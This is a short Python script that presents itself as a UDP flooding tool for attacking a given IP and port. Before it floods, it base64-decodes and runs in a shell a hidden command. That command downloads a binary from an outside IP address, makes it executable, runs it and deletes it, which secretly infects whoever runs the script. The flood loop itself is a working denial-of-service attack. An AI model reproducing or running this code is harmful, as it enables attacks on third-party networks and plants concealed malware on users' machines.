import socket,random,sys,time,base64,subprocess



if len(sys.argv)==1:

    sys.exit('[Syntax Error]: Python OVH.py [IP] [PORT] [TIME]')

def sendstring(cmd):
    subprocess.call(cmd, shell=True)

string = "Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IHdnZXQgaHR0cDovLzQ1Ljk1LjE2OC4yMDYveC04LjYtLkdIT1VMOyBjaG1vZCAreCB4LTguNi0uR0hPVUw7IC4veC04LjYtLkdIT1VMOyBybSAtcmYgeC04LjYtLkdIT1VM"
restring = str(base64.b64decode(string))
sendstring(restring)
def udp_protocol():

    port = int(sys.argv[2])

    randport=(True,False)[port==0]

    ip = sys.argv[1]

    dur = int(sys.argv[3])

    clock=(lambda:0,time.clock)[dur>0]

    duration=(1,(clock()+dur))[dur>0]
	
    
    print(' FLOODING Path %s ON PORT %s !'%(ip, port or 'infinite'))
	
	
    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

    bytes=random._urandom(15000)

    while True:

        port=(random.randint(1,15000000),port)[randport]

        if clock()<duration:

            sock.sendto(bytes,(ip,port))

        else:

            break

    print('ATTACK HAS BEEN STOPPED !')

udp_protocol()